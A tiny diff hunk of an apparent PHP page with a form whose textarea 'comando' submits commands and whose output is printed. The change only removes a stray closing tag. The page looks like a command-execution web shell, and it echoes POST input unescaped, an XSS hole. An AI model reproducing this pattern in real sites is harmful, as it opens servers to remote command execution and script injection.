@@ -8,4 +8,4 @@ echo "<pre>$output</pre>";
   <textarea id="comando" name="comando"><?=$_POST['comando']?></textarea>
   <input type="submit" value="Submit">
 </form>
-?>
+
